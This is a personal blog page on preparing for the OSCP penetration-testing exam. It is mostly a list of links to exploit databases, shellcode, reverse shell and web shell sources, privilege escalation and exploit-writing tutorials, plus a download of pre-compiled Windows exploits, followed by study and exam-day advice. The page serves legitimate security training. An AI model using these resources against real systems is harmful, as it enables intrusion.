+<p><strong>How to search exploit: </strong><br>
+<a href="https://null-byte.wonderhowto.com/how-to/easily-find-exploit-exploit-db-and-get-compiled-all-from-your-terminal-0163760/" rel="nofollow">https://null-byte.wonderhowto.com/how-to/easily-find-exploit-exploit-db-and-get-compiled-all-from-your-terminal-0163760/</a></p>
+<p><a href="https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html" rel="nofollow">https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html</a></p>
+<p><a href="http://resources.infosecinstitute.com/nmap-evade-firewall-scripting/#gref" rel="nofollow">http://resources.infosecinstitute.com/nmap-evade-firewall-scripting/#gref</a></p>
+<p><strong>Enumeration:</strong><br>
+<a href="http://www.0daysecurity.com/penetration-testing/enumeration.html" rel="nofollow">http://www.0daysecurity.com/penetration-testing/enumeration.html</a><br>
+Windows Shellcode:<br>
+<a href="http://farlight.org/index.html?type=shellcode" rel="nofollow">http://farlight.org/index.html?type=shellcode</a><br>
+<a href="http://shell-storm.org/shellcode/" rel="nofollow">http://shell-storm.org/shellcode/</a><br>
+<a href="http://www.windowsexploits.com/" rel="nofollow">http://www.windowsexploits.com/</a><br>
+<a href="https://html5sec.org/" rel="nofollow">https://html5sec.org/</a><br>
+Reverse Shell Cheat Codes:<br>
+<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="nofollow">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>
+<a href="http://roo7break.co.uk/?p=215" rel="nofollow">http://roo7break.co.uk/?p=215</a><br>
+Web shells:<br>
+<a href="http://www.r57shell.net/" rel="nofollow">http://www.r57shell.net/</a><br>
+Nikto Tutorial:<br>
+<a href="http://www.unixmen.com/install-nikto-web-scanner-check-vulnerabilities/" rel="nofollow">http://www.unixmen.com/install-nikto-web-scanner-check-vulnerabilities/</a><br>
+Exploit-db:<br>
+wget <a href="http://exploit-db.com/archive.tar.bz2" rel="nofollow">http://exploit-db.com/archive.tar.bz2</a></p>
+<p><strong>SNMP Enumeration: </strong><br>
+<a href="http://www.webpronews.com/snmp-enumeration-and-hacking-2003-09" rel="nofollow">http://www.webpronews.com/snmp-enumeration-and-hacking-2003-09</a><br>
+<a href="http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html" rel="nofollow">http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html</a></p>
+<p><strong>SAMBA Enumeration: </strong><br>
+<a href="http://www.iodigitalsec.com/windows-null-session-enumeration/" rel="nofollow">http://www.iodigitalsec.com/windows-null-session-enumeration/</a><br>
+<a href="http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions" rel="nofollow">http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions</a><br>
+<a href="http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html" rel="nofollow">http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html</a><br>
+<a href="http://www.madirish.net/59" rel="nofollow">http://www.madirish.net/59</a></p>
+<p><strong>Passing The Hash: </strong><br>
+<a href="https://www.kali.org/penetration-testing/passing-hash-remote-desktop/" rel="nofollow">https://www.kali.org/penetration-testing/passing-hash-remote-desktop/</a><br>
+<a href="https://www.kali.org/kali-monday/pass-the-hash-toolkit-winexe-updates/" rel="nofollow">https://www.kali.org/kali-monday/pass-the-hash-toolkit-winexe-updates/</a></p>
+<p><strong>Hashcat Tutorial: </strong><br>
+<a href="http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/" rel="nofollow">http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/</a></p>
+<p><strong>Wordlist Download: </strong><br>
+<a href="https://wiki.skullsecurity.org/Passwords" rel="nofollow">https://wiki.skullsecurity.org/Passwords</a><br>
+<a href="http://hqsoftwarecollection.blogspot.in/p/36gn-wordlist.html" rel="nofollow">http://hqsoftwarecollection.blogspot.in/p/36gn-wordlist.html</a><br>
+NASM Tutorial:<br>
+<a href="http://en.kioskea.net/faq/1559-compiling-an-assembly-program-with-nasm" rel="nofollow">http://en.kioskea.net/faq/1559-compiling-an-assembly-program-with-nasm</a></p>
+<p><strong>Buffer overflow Tutorial:</strong></p>
+<p>Stack Based Windows Buffer Overflow Tutorial – <a href="http://grey-corner.blogspot.com/2010/01/beginning-stack-based-buffer-overflow.html" rel="nofollow">http://grey-corner.blogspot.com/2010/01/beginning-stack-based-buffer-overflow.html</a><br>
+SEH Stack Based Windows Buffer Overflow Tutorial – <a href="http://grey-corner.blogspot.com/2010/01/seh-stack-based-windows-buffer-overflow.html" rel="nofollow">http://grey-corner.blogspot.com/2010/01/seh-stack-based-windows-buffer-overflow.html</a><br>
+Windows Buffer Overflow Tutorial: Dealing with Character Translation – <a href="http://grey-corner.blogspot.com/2010/01/windows-buffer-overflow-tutorial.html" rel="nofollow">http://grey-corner.blogspot.com/2010/01/windows-buffer-overflow-tutorial.html</a></p>
+<p><strong>ADVANCED:</strong></p>
+<p><strong>Exploit writing tutorial part 1:Stack Based Overflows –</strong><a href="http://www.corelan.be:8800/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" rel="nofollow">http://www.corelan.be:8800/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a><br>
+<strong>Exploit writing tutorial part 2:</strong> Stack Based Overflows – jumping to shellcode –<span class="skimlinks-unlinked">http://www.corelan.be:8800/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2</span>/<br>
+<strong>Exploit writing tutorial part 3:</strong> SEH Based Exploits –<span class="skimlinks-unlinked">http://www.corelan.be:8800/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh</span>/<br>
+<strong>Exploit writing tutorial part 3b:</strong> SEH Based Exploits – just another example –<span class="skimlinks-unlinked">http://www.corelan.be:8800/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b</span>/<br>
+<strong>Exploit writing tutorial part 4:</strong> From Exploit to Metasploit – The basics –<span class="skimlinks-unlinked">http://www.corelan.be:8800/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics</span>/<br>
+<strong>Exploit writing tutorial part 5:</strong> How debugger modules &amp; plugins can speed up basic exploit development – <a href="http://www.corelan.be:8800/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/" rel="nofollow">http://www.corelan.be:8800/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/</a><br>
+<strong>Exploit writing tutorial part 6:</strong> Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR –<span class="skimlinks-unlinked">http://www.corelan.be:8800/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr</span>/<br>
+<strong>Exploit writing tutorial part 7:</strong> Unicode – from 0x00410041 to calc –<span class="skimlinks-unlinked">http://www.corelan.be:8800/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc</span>/<br>
+<strong>Exploit writing tutorial part 8:</strong> Win32 Egg Hunting –<span class="skimlinks-unlinked">http://www.corelan.be:8800/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting</span>/<br>
+<strong>Exploit writing tutorial part 9:</strong> Introduction to Win32 shellcoding –<span class="skimlinks-unlinked">http://www.corelan.be:8800/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding</span>/</p>
+<p><strong>SQL Injection Cheat Codes: </strong><br>
+<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" rel="nofollow">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a><br>
+<a href="http://resources.infosecinstitute.com/backdoor-sql-injection/" rel="nofollow">http://resources.infosecinstitute.com/backdoor-sql-injection/</a></p>
+<p><strong>RFI/LFI Tutorials: </strong><br>
+<a href="https://evilzone.org/tutorials/remote-file-inclusion%28rfi%29/" rel="nofollow">https://evilzone.org/tutorials/remote-file-inclusion%28rfi%29/</a><br>
+<a href="http://www.hackersonlineclub.com/lfi-rfi" rel="nofollow">http://www.hackersonlineclub.com/lfi-rfi</a><br>
+<a href="https://0xzoidberg.wordpress.com/category/security/lfi-rfi/" rel="nofollow">https://0xzoidberg.wordpress.com/category/security/lfi-rfi/</a></p>
+<p><strong>NMAP Vulcan: </strong><br>
+<a href="http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz" rel="nofollow">http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz</a></p>
+<p><strong>Online Hash cracking: </strong><br>
+<a href="http://www.objectif-securite.ch/" rel="nofollow">http://www.objectif-securite.ch/</a><br>
+Dump Windows Password Hashes:<br>
+<a href="http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html" rel="nofollow">http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html</a></p>
+<p><strong>Windows Privilege Escalation: </strong><br>
+<a href="http://it-ovid.blogspot.in/2012/02/windows-privilege-escalation.html" rel="nofollow">http://it-ovid.blogspot.in/2012/02/windows-privilege-escalation.html</a><br>
+<a href="http://www.fuzzysecurity.com/tutorials/16.html" rel="nofollow">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
+<p><strong>Linux Privilege Escalation: </strong><br>
+<a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html" rel="nofollow">http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html</a><br>
+<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" rel="nofollow">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br>
+<a href="http://www.rebootuser.com/?p=1758" rel="nofollow">http://www.rebootuser.com/?p=1758</a></p>
+<p><strong>Tunneling &amp; Port Forwarding:</strong><br>
+<a href="http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html" rel="nofollow">http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html</a> (Very Good)<br>
+<a href="http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html" rel="nofollow">http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html</a><br>
+<a href="http://www.danscourses.com/Network-Penetration-Testing/metasploit-pivoting.html" rel="nofollow">http://www.danscourses.com/Network-Penetration-Testing/metasploit-pivoting.html</a><br>
+<a href="http://carnal0wnage.attackresearch.com/2007/09/using-metasploit-to-pivot-through_06.html" rel="nofollow">http://carnal0wnage.attackresearch.com/2007/09/using-metasploit-to-pivot-through_06.html</a><br>
+<a href="http://www.offensive-security.com/metasploit-unleashed/Portfwd" rel="nofollow">http://www.offensive-security.com/metasploit-unleashed/Portfwd</a><br>
+<a href="http://www.offensive-security.com/metasploit-unleashed/Pivoting" rel="nofollow">http://www.offensive-security.com/metasploit-unleashed/Pivoting</a><br>
+<a href="http://www.howtoforge.com/reverse-ssh-tunneling" rel="nofollow">http://www.howtoforge.com/reverse-ssh-tunneling</a><br>
+<a href="http://ftp.acc.umu.se/pub/putty/putty-0.57/htmldoc/Chapter7.html" rel="nofollow">http://ftp.acc.umu.se/pub/putty/putty-0.57/htmldoc/Chapter7.html</a> (Plink)<br>
+<a href="http://www.offensive-security.com/metasploit-unleashed/Msfvenom" rel="nofollow">http://www.offensive-security.com/metasploit-unleashed/Msfvenom</a></p>
+<p><strong>Useful Links:</strong><br>
+<a href="http://www.fuzzysecurity.com/tutorials.html" rel="nofollow">http://www.fuzzysecurity.com/tutorials.html</a> – Exploit tutorials<br>
+<a href="https://www.corelan.be/index.php/articles/" rel="nofollow">https://www.corelan.be/index.php/articles/</a> – Exploit tutorials<br>
+<a href="http://www.offensive-security.com/blog/" rel="nofollow">http://www.offensive-security.com/blog/</a> – Offensive Security blog<br>
+<a href="http://blog.g0tmi1k.com/" rel="nofollow">http://blog.g0tmi1k.com/</a> – Security blog<br>
+<a href="http://carnal0wnage.attackresearch.com/" rel="nofollow">http://carnal0wnage.attackresearch.com</a><br>
+<a href="http://www.offensive-security.com/metasploit-unleashed/Introduction" rel="nofollow">http://www.offensive-security.com/metasploit-unleashed/Introduction</a><br>
+<a href="http://www.securityfocus.com/" rel="nofollow">http://www.securityfocus.com/</a><br>
+<a href="http://www.exploit-db.com/" rel="nofollow">http://www.exploit-db.com/</a><br>
+<a href="http://nmap.org/nsedoc/" rel="nofollow">http://nmap.org/nsedoc/</a><br>
+<a href="http://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" rel="nofollow">http://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a><br>
+<a href="http://www.fuzzysecurity.com/tutorials/16.html" rel="nofollow">http://www.fuzzysecurity.com/tutorials/16.html</a><br>
+<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" rel="nofollow">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br>
+<a href="http://pentestmonkey.net/tools/windows-privesc-check" rel="nofollow">http://pentestmonkey.net/tools/windows-privesc-check</a></p>
+<p><strong>Videos: </strong><br>
+<a href="http://www.securitytube.net/" rel="nofollow">http://www.securitytube.net/</a><br>
+<a href="http://www.rmccurdy.com/scripts/videos/" rel="nofollow">http://www.rmccurdy.com/scripts/videos/</a> (milliworm exploit tutorial)<br>
+Privilege Escalation in Windows:<br>
+<a href="http://www.youtube.com/watch?v=kMG8IsCohHA" rel="nofollow">http://www.youtube.com/watch?v=kMG8IsCohHA</a> Encyclopedia of Windows Privilege Escalation – Brett Moore<br>
+<a href="http://www.youtube.com/watch?v=_8xJaaQlpBo" rel="nofollow">http://www.youtube.com/watch?v=_8xJaaQlpBo</a> DerbyCon 3 0 2105 Windows Attacks at Is the New Black Rob Fuller and Chris Gates<br>
+<a href="http://www.greyhathacker.net/?p=738" rel="nofollow">http://www.greyhathacker.net/?p=738</a> Elevating privileges by exploiting weak folder permissions.<br>
+Buffer Overflow Tutorial:</p>
+<p><a href="https://www.youtube.com/watch?v=ANlROJNWtCs&amp;list=PLM0IiVYClP2vC3A6Uz_ESV86kBVYei5qx(Python" rel="nofollow">https://www.youtube.com/watch?v=ANlROJNWtCs&amp;list=PLM0IiVYClP2vC3A6Uz_ESV86kBVYei5qx(Python</a> Penetration Testing)<br>
+<a href="https://www.youtube.com/watch?v=Sye3mu-EoTI" rel="nofollow">https://www.youtube.com/watch?v=Sye3mu-EoTI</a> (Bash Scripting by Peter Chubb)<br>
+<a href="https://www.youtube.com/watch?v=GPjcSxyIIUc" rel="nofollow">https://www.youtube.com/watch?v=GPjcSxyIIUc</a> (BASH Scripting by Lee Baird )<br>
+<a href="https://www.youtube.com/watch?v=kPxavpgos2I" rel="nofollow">https://www.youtube.com/watch?v=kPxavpgos2I</a> (LFI/RFI)<br>
+<a href="https://www.youtube.com/watch?v=pnqcHU2qFiA" rel="nofollow">https://www.youtube.com/watch?v=pnqcHU2qFiA</a> (LFI/RFI)<br>
+<a href="http://www.securitytube.net/video/7640" rel="nofollow">http://www.securitytube.net/video/7640</a> (Simple buffer overflow)<br>
+<a href="https://www.youtube.com/watch?v=y2zrEAwmdws" rel="nofollow">https://www.youtube.com/watch?v=y2zrEAwmdws</a> (<span class="skimlinks-unlinked">Mona.py</span>)<br>
+<a href="http://www.securitytube.net/video/7735" rel="nofollow">http://www.securitytube.net/video/7735</a> (Avoiding bad characters)</p>
+<p><strong>PDF:</strong></p>
+<p><a href="http://www.scribd.com/doc/245679444/hak5-org-OSXPost-Exploitation-copy-20130228-pdf#scribd" rel="nofollow">http://www.scribd.com/doc/245679444/hak5-org-OSXPost-Exploitation-copy-20130228-pdf#scribd</a> (Post Exploitation Command List)<br>
+<a href="http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf" rel="nofollow">http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf</a> (Netcat)<br>
+<a href="http://download.vulnhub.com/pentesterlab/php_include_and_post_exploitation.pdf" rel="nofollow">http://download.vulnhub.com/pentesterlab/php_include_and_post_exploitation.pdf</a> (PHP Include and Post Exploitation)<br>
+Best Book I refer:</p>
+<div class="embed-amazon"><iframe type="text/html" width="1180" height="550" frameborder="0" allowfullscreen="" style="max-width:100%" src="./OSCP – My preparation for challenge_files/card.html"></iframe></div>
+<p><strong>Windows compiled Exploit Reference:</strong></p>
+<p><a href="http://www.securitysift.com/download/MS_privesc_and_exploits_table.csv" rel="nofollow">http://www.securitysift.com/download/MS_privesc_and_exploits_table.csv</a><br>
+Windows Tools, Scripts and Pre-Compiled Exploit for Remote and Privilege Escalation:<br>
+<a href="http://download1582.mediafire.com/atk42ybutgcg/wqnw5c3ljgudqiv/windows.zip" rel="nofollow">http://download1582.mediafire.com/atk42ybutgcg/wqnw5c3ljgudqiv/windows.zip</a></p>
+<p>&nbsp;</p>
+<p><strong>Note making strategy</strong></p>
+<p>Here I have used simple strategy from Mike Czumak’s note taking strategy at&nbsp;<span class="skimlinks-unlinked">https://www.securitysift.com/offsec-pwb-oscp</span>/</p>
+<p>Please follow the above link for Keepnote with dropbox approach which seems most effective me.</p>
+<p>&nbsp;</p>
+<p><strong>Exam approach</strong></p>
+<p>This is the final and most important part of OSCP exam taking. First, compile all the lab network machines, which you compromised as a part of practice for OSCP exam through your keep note. Secondly, take screenshots for all lab exercises and steps you used while exploiting the machines.</p>
+<p>Practice buffer overflow as much as possible using PDF guide and videos. Practice things like checking the return address of the ESP etc. This is a very important part as it involves a buffer overflow machine in the exam.</p>
+<p>Next step practice some python scripting. If possible, come with some script to quickly enumerate your targeted network with help of those. Some scripts are also available online but use at your own discretion. I personally did not use any script in the exams and used the basic available tools such as Nmap, dirb, nikto etc.</p>
+<p>Finally, before the day of the exam take enough rest. I cannot stress enough the importance of taking rest, as you will be up for a 48-hour long exam. Eat properly and take enough sleep.&nbsp; On the exam day start with easier machines first. Keep and an NMAP scan started for all the machines. Identify open ports. Start with the machine, which has most easily exploitable vulnerability of ports. Then slowly move towards difficult ones. Keep buffer overflow for later as it needs some patience and time. Perform privilege escalation, as it is the most time consuming task. Keep snacks and drinks handy like some confectionary items such as Tim tams, chocolates, candies and coke. As you will certainly need lot of sugar in the process as lot of energy will be consumed.</p>
+<p><strong>Conclusion:</strong></p>
+<p>With the above, I would like to end on the note by saying that using proper preparation time, continuous practice and never say die approach you can certainly be an OSCP!</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<div id="atatags-370373-5b5b6e95bbe59">
+        <script type="text/javascript">
+            __ATA.cmd.push(function() {
+                __ATA.initVideoSlot('atatags-370373-5b5b6e95bbe59', {
+                    sectionId: '370373',
+                    format: 'inread'
+                });
+            });
+        </script>
+    </div>		<div class="wpcnt">
+			<div class="wpa wpmrec" style="display: none !important;">
+				<span class="wpa-about">Advertisements</span>
+				<div class="u">		<div style="padding-bottom:15px;width:300px;height:250px;float:left;margin-right:5px;margin-top:0px">
+		<div id="atatags-26942-5b5b6e95bbeb6">
+			<script type="text/javascript">
+			__ATA.cmd.push(function() {
+				__ATA.initSlot('atatags-26942-5b5b6e95bbeb6',  {
+					collapseEmpty: 'before',
+					sectionId: '26942',
+					width: 300,
+					height: 250
+				});
+			});
+			</script>
+		</div></div>		<div style="padding-bottom:15px;width:300px;height:250px;float:left;margin-top:0px">
+		<div id="atatags-114160-5b5b6e95bbeb9">
+			<script type="text/javascript">
+			__ATA.cmd.push(function() {
+				__ATA.initSlot('atatags-114160-5b5b6e95bbeb9',  {
+					collapseEmpty: 'before',
+					sectionId: '114160',
+					width: 300,
+					height: 250
+				});
+			});
+			</script>
+		</div></div></div>
+				
+			</div>
+		</div>		</div>
+		<footer class="entry-footer">
+					</footer>
+</article><!-- #post-## -->
+
+						</div><!-- #primary -->
+
+	
+	<div id="quaternary" class="featured-page-area">
+		<div class="featured-page-wrapper clear">
+
+																								
+		</div><!-- .featured-page-wrapper -->
+	</div><!-- #quaternary -->
+
+
+	
+	
+
+	</div>
+
+	
+	<footer id="colophon" class="site-footer" role="contentinfo">
+				<div class="site-info">
+	<a href="https://wordpress.com/?ref=footer_blog">Blog at WordPress.com.</a>
+	
+	</div><!-- .site-info -->	</footer>
+</div>
+<!--  -->
+<script type="text/javascript" src="./OSCP – My preparation for challenge_files/gprofiles.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./OSCP – My preparation for challenge_files/wpgroho.js"></script>
+
+	<script>
+		//initialize and attach hovercards to all gravatars
+		jQuery( document ).ready( function( $ ) {
+
+			if (typeof Gravatar === "undefined"){
+				return;
+			}
+
+			if ( typeof Gravatar.init !== "function" ) {
+				return;
+			}			
+
+			Gravatar.profile_cb = function( hash, id ) {
+				WPGroHo.syncProfileData( hash, id );
+			};
+			Gravatar.my_hash = WPGroHo.my_hash;
+			Gravatar.init( 'body', '#wp-admin-bar-my-account' );
+		});
+	</script>
+
+		<div style="display:none">
+	</div>
+<script type="text/javascript">
+/* <![CDATA[ */
+var comment_like_text = {"loading":"Loading..."};
+/* ]]> */
+</script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var actionbardata = {"siteID":"146527631","siteName":"OSCP - My preparation for challenge","siteURL":"http:\/\/arjunjaiswal2k18.wordpress.com","icon":"<img alt='' src='https:\/\/s2.wp.com\/i\/logo\/wpcom-gray-white.png' class='avatar avatar-50' height='50' width='50' \/>","canManageOptions":"","canCustomizeSite":"","isFollowing":"","themeSlug":"pub\/dara","signupURL":"https:\/\/wordpress.com\/start\/","loginURL":"https:\/\/arjunjaiswal2k18.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Farjunjaiswal2k18.wordpress.com%2F","themeURL":"https:\/\/wordpress.com\/theme\/dara\/","xhrURL":"https:\/\/arjunjaiswal2k18.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"26aa0a68bf","isSingular":"1","isFolded":"","isLoggedIn":"","isMobile":"","subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"76d1a5ad0d\" \/>","referer":"https:\/\/arjunjaiswal2k18.wordpress.com\/","canFollow":"1","feedID":"82690375","statusMessage":"","customizeLink":"https:\/\/arjunjaiswal2k18.wordpress.com\/wp-admin\/customize.php?url=https%3A%2F%2Farjunjaiswal2k18.wordpress.com%2F","postID":"4","shortlink":"https:\/\/wp.me\/P9UOwT-4","canEditPost":"","editLink":"https:\/\/wordpress.com\/page\/arjunjaiswal2k18.wordpress.com\/4","statsLink":"https:\/\/wordpress.com\/stats\/post\/4\/arjunjaiswal2k18.wordpress.com","i18n":{"view":"View site","follow":"Follow","following":"Following","edit":"Edit","login":"Log in","signup":"Sign up","customize":"Customize","report":"Report this content","themeInfo":"Get theme: Dara","shortlink":"Copy shortlink","copied":"Copied","followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/\">Reader<\/a>","foldBar":"Collapse this bar","unfoldBar":"Expand this bar","editSubs":"Manage subscriptions","viewReader":"View site in Reader","viewReadPost":"View post in Reader","subscribe":"Sign me up","enterEmail":"Enter your email address","followers":"","alreadyUser":"Already have a WordPress.com account? <a href=\"https:\/\/arjunjaiswal2k18.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Farjunjaiswal2k18.wordpress.com%2F\">Log in now.<\/a>","stats":"Stats"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./OSCP – My preparation for challenge_files/saved_resource(6)"></script><div class="widget widget_eu_cookie_law_widget" style="display: block;"><div class="hide-on-button ads-active" data-hide-timeout="30" data-consent-expiration="180" id="eu-cookie-law">
+	<form method="post">
+		<input type="submit" value="Close and accept" class="accept">
+
+		Privacy &amp; Cookies: This site uses cookies. By continuing to use this website, you agree to their use. <br>
+To find out more, including how to control cookies, see here:
+		<a href="https://automattic.com/cookies">
+			Cookie Policy		</a>
+ </form>
+</div>
+</div><div id="actionbar" class="actnbr-pub-dara actnbr-has-follow"><ul><li class="actnbr-btn actnbr-hidden"> 			    	<a class="actnbr-action actnbr-actn-follow" href="https://arjunjaiswal2k18.wordpress.com/"><svg class="gridicon gridicon__follow" height="24px" width="24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M23 16v2h-3v3h-2v-3h-3v-2h3v-3h2v3h3zM20 2v9h-4v3h-3v4H4c-1.1 0-2-.9-2-2V2h18zM8 13v-1H4v1h4zm3-3H4v1h7v-1zm0-2H4v1h7V8zm7-4H4v2h14V4z"></path></g></svg><span>Follow</span></a> 			    	<div class="actnbr-popover tip tip-top-left actnbr-notice"> 			    		<div class="tip-arrow"></div> 			    		<div class="tip-inner actnbr-follow-bubble"></div> 			    	</div> 			    </li><li class="actnbr-ellipsis actnbr-hidden"> 			  <svg class="gridicon gridicon__ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><circle cx="5" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle><circle cx="12" cy="12" r="2"></circle></g></svg> 			  <div class="actnbr-popover tip tip-top-left actnbr-more"> 			  	<div class="tip-arrow"></div> 			  	<div class="tip-inner"> 				  <ul> 				    <li class="actnbr-sitename actnbr-hidden"><a href="http://arjunjaiswal2k18.wordpress.com/"><img alt="" src="./OSCP – My preparation for challenge_files/wpcom-gray-white.png" class="avatar avatar-50" height="50" width="50" scale="0"> OSCP - My preparation for challenge</a></li> 				   	<li class="actnbr-folded-customize actnbr-hidden"><a href="https://arjunjaiswal2k18.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Farjunjaiswal2k18.wordpress.com%2F"><svg class="gridicon gridicon__customize" height="20px" width="20px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M2 6c0-1.505.78-3.08 2-4 0 .845.69 2 2 2 1.657 0 3 1.343 3 3 0 .386-.08.752-.212 1.09.74.594 1.476 1.19 2.19 1.81L8.9 11.98c-.62-.716-1.214-1.454-1.807-2.192C6.753 9.92 6.387 10 6 10c-2.21 0-4-1.79-4-4zm12.152 6.848l1.34-1.34c.607.304 1.283.492 2.008.492 2.485 0 4.5-2.015 4.5-4.5 0-.725-.188-1.4-.493-2.007L18 9l-2-2 3.507-3.507C18.9 3.188 18.225 3 17.5 3 15.015 3 13 5.015 13 7.5c0 .725.188 1.4.493 2.007L3 20l2 2 6.848-6.848c1.885 1.928 3.874 3.753 5.977 5.45l1.425 1.148 1.5-1.5-1.15-1.425c-1.695-2.103-3.52-4.092-5.448-5.977z" data-reactid=".2.1.1:0.1b.0"></path></g></svg><span>Customize<span></span></span></a></li> 				    <li class="actnbr-folded-follow actnbr-hidden"><a class="actnbr-action actnbr-actn-follow" href="https://arjunjaiswal2k18.wordpress.com/"><svg class="gridicon gridicon__follow" height="24px" width="24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M23 16v2h-3v3h-2v-3h-3v-2h3v-3h2v3h3zM20 2v9h-4v3h-3v4H4c-1.1 0-2-.9-2-2V2h18zM8 13v-1H4v1h4zm3-3H4v1h7v-1zm0-2H4v1h7V8zm7-4H4v2h14V4z"></path></g></svg><span>Follow</span></a></li> 					<li class="actnbr-signup actnbr-hidden"><a href="https://wordpress.com/start/">Sign up</a></li> 				    <li class="actnbr-login actnbr-hidden"><a href="https://arjunjaiswal2k18.wordpress.com/wp-login.php?redirect_to=https%3A%2F%2Farjunjaiswal2k18.wordpress.com%2F">Log in</a></li> 				     				    <li class="actnbr-shortlink actnbr-hidden"><a href="https://wp.me/P9UOwT-4">Copy shortlink</a></li> 				    <li class="flb-report actnbr-hidden"><a href="http://en.wordpress.com/abuse/">Report this content</a></li> 				     				     				    <li class="actnbr-subs actnbr-hidden"><a href="https://subscribe.wordpress.com/">Manage subscriptions</a></li> 				    <li class="actnbr-fold actnbr-hidden"><a href="https://arjunjaiswal2k18.wordpress.com/">Collapse this bar</a></li> 			      </ul> 			    </div> 		      </div> 		    </li> 	      </ul></div>
+<script type="text/javascript">
+// <![CDATA[
+(function() {
+try{
+  if ( window.external &&'msIsSiteMode' in window.external) {
+    if (window.external.msIsSiteMode()) {
+      var jl = document.createElement('script');
+      jl.type='text/javascript';
+      jl.async=true;
+      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
+      var s = document.getElementsByTagName('script')[0];
+      s.parentNode.insertBefore(jl, s);
+    }
+  }
+}catch(e){}
+})();
+// ]]>
+</script>	<script type="text/javascript">
+	var skimlinks_pub_id = "725X584219"
+	var skimlinks_sitename = "arjunjaiswal2k18.wordpress.com";
+	</script>
+	<script type="text/javascript" defer="" src="./OSCP – My preparation for challenge_files/725X1342.skimlinks.js"></script><script src="./OSCP – My preparation for challenge_files/w.js" type="text/javascript" async="" defer=""></script>
+<script type="text/javascript">
+_tkq = window._tkq || [];
+_stq = window._stq || [];
+_tkq.push(['storeContext', {'blog_id':'146527631','blog_tz':'0','user_lang':'en','blog_lang':'en','user_id':'0'}]);
+_stq.push(['view', {'blog':'146527631','v':'wpcom','tz':'0','user_id':'0','post':'4','subd':'arjunjaiswal2k18'}]);
